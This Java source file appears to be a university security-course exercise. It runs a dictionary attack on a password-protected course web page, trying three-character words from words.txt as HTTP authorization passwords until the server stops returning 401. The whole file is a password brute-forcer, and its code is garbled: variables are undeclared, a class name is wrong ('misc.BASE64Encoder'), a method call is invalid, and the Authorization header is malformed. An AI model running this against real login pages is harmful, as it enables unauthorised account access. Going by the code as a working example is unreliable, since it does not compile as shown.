import java.net.*; 
import java.io.*; 
import java.util.Vector;
import java.util.Date;
import java.security.*;











  
public class Dictionary { 
  public static BufferedReader in;
  
  
  public static void main(String[] args) throws Exception {   
    String baseURL = "http://sec-crack.cs.rmit.edu./SEC/2/index.php";    
    int count=0;
    Date date = new Date();
     startTime=date.getTime();
    int LIMITINMINUTES=45;
    int TIMELIMIT=LIMITINMINUTES*1000*60;
    boolean timedOut=false;
    boolean found=false;
   
    
    Vector dictionary=new Vector(readWords());
    System.out.println("Words in dictionary: "+dictionary.size());
 
    
    
    
    
    
    
    while (found==false && timedOut==false && dictionary.elementAt(count)!=null) {
      
      Date endDate = new Date();
       endTime=endDate.getTime();    
      if (endTime>(TIMELIMIT+startTime)){
        System.out.println("Timed out");
        timedOut=true;
      }
      
      String password = "";

      
      URL url = new URL(baseURL); 
      String username="";
      password = dictionary.elementAt(count).toString(); 

      
      String authString = username+":"+password;
      String encoding = new misc.BASE64Encoder().encode(authString.getBytes()); 
      System.out.print("authString is: "+authString);     
      
      URLConnection urlConnect=url.openConnection();

      
      urlConnect.setRequestProperty("Authorization"," "+encoding);

      String responseCode = urlConnect.getHeaderField(0);
      System.out.print(" Response  is: ");
      System.out.println(responseCode);

      if (!responseCode.equals("HTTP/1.1 401 Authorization Required")) {
        found=true;
      }          
      if (found){ 
      
        System.out.println("Password is: "+password);

      }

      Date foundDate = new Date();
       foundTime=foundDate.getTime();  
      foundTime=(foundTime-startTime);
      System.out.println("Time taken was : "+foundTime+" milliseconds"); 
      count=count+1;
    }
  } 
  
  
  
  
  
  public static Vector readWords() {   
    String nextWord;
    String lastWord="";
    Vector dict=new Vector();
    try {
      BufferedReader in = new BufferedReader(new FileReader("words.txt"));
      while ((nextWord = in.readLine())!=null) {
	
        if (nextWord.length()>3) {
          nextWord=nextWord.substring(0,3);
        }
	
	if (!lastWord.equals(nextWord) && nextWord.length()>0){
          lastWord = nextWord;
	  
	 
	  dict.addElement(nextWord);

	  
	  
	 
	 
	 

	  
	 
	 
	    
	  
	   
	   
	   
	   
	   

	    
	   
	   
	  
	  
	  
	  

	    
	   
	   
	      
	   
	   
	   

	      
	   
	    
	    

	      
	    
	    
	    

	      
	    
	    
	    
	   
	
	}  
      }  
       System.out.println("File successfully loaded");	     
    }  
    catch (FileNotFoundException e1) {
      System.out.println("This program requires a dictionary of words called words.txt   in the same directory as the program running, now exiting.");
      System.exit(0);
    }	
    catch (IOException e2) {
      System.out.println("IO Exception, exiting");
      System.exit(0);
    }	    
    finally {
      try {
	if (null!=in) {
          in.get();
	}
      }
      catch (IOException e3) {}
    }
    return dict;
  } 
}  
